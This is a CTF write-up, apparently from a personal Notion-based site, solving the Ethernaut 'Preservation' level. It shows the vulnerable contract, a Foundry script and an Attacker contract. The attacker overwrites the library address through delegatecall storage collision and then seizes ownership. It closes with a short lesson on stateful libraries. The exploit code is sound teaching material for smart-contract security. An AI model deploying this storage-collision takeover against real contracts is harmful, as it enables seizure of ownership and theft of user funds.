---
title: "Preservation"
date: "2024-02-24"
lastmod: "2024-02-24T12:09:00.000Z"
draft: false
difficulty: "⭐⭐⭐⭐"
prev: "Naught-Coin-5013cfef45d646e693a6feaac127ac33"
weight: 17
state: "En cours"
level-url: "https://ethernaut.openzeppelin.com/level/16"
type: "docs"
NOTION_METADATA:
  object: "page"
  id: "15486d55-3b70-48eb-a93b-e9c33dcdd447"
  created_time: "2024-02-24T11:18:00.000Z"
  last_edited_time: "2024-02-24T12:09:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel16.svg"
  parent:
    type: "database_id"
    database_id: "cb6853ff-d731-4d6a-9080-6c8efeec5b1c"
  archived: false
  properties:
    difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "f9c2f40a-0144-4e6d-a134-6b9fd725f7a9"
        name: "⭐⭐⭐⭐"
        color: "red"
    prev:
      id: "LLP%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Naught-Coin-5013cfef45d646e693a6feaac127ac33"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Naught-Coin-5013cfef45d646e693a6feaac127ac33"
          href: null
    date:
      id: "Y%40Gy"
      type: "date"
      date:
        start: "2024-02-24"
        end: null
        time_zone: null
    weight:
      id: "%5Dyda"
      type: "number"
      number: 17
    state:
      id: "f%40ps"
      type: "status"
      status:
        id: "e1f6ef4b-49ae-427f-9bb4-8736089f3aa2"
        name: "En cours"
        color: "blue"
    level-url:
      id: "juZs"
      type: "url"
      url: "https://ethernaut.openzeppelin.com/level/16"
    next:
      id: "pocA"
      type: "rich_text"
      rich_text: []
    type:
      id: "s%7DKc"
      type: "select"
      select:
        id: "OnJy"
        name: "docs"
        color: "default"
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Preservation"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Preservation"
          href: null
  url: "https://www.notion.so/Preservation-15486d553b7048eba93be9c33dcdd447"
  public_url: null
UPDATE_TIME: "2024-02-24T12:12:20.856Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


This contract utilizes a library to store two different times for two different
timezones. The constructor creates two instances of the library for each time
to be stored.


The goal of this level is for you to claim ownership of the instance you are given.


Things that might help

- Look into Solidity's documentation on the `delegatecall` low level function,
how it works, how it can be used to delegate operations to on-chain.
libraries, and what implications it has on execution scope.
- Understanding what it means for `delegatecall` to be context-preserving.
- Understanding how storage variables are stored and accessed.
- Understanding how casting works between different data types.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

```


Solution:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Attacker,Preservation} from "../src/16.sol";

contract POC is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_16");
        address pubKey = vm.envAddress("PUBLIC_KEY");

        vm.startBroadcast(deployerPrivateKey);

        Attacker attacker = new Attacker();

        attacker.attack(addr, pubKey);
        console.logAddress(Preservation(addr).owner());

        vm.stopBroadcast();

    }
}
```


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Preservation {
  function timeZone1Library() external returns(address);
  function setFirstTime(uint _timeStamp) external;
  function owner() external returns(address);
}

contract Attacker {
  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;

  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  function attack(address _preservation, address newOwner) public {
      Preservation preservation = Preservation(_preservation);
      preservation.setFirstTime(uint160(address(this)));
      preservation.setFirstTime(uint160(address(newOwner)));
  }

  function setTime(uint _time) public {
    owner = address(uint160(_time));
  }
}

```


As the previous level, `delegate` mentions, the use of `delegatecall` to call
libraries can be risky. This is particularly true for contract libraries that
have their own state. This example demonstrates why the `library` keyword
should be used for building libraries, as it prevents the libraries from
storing and accessing state variables.

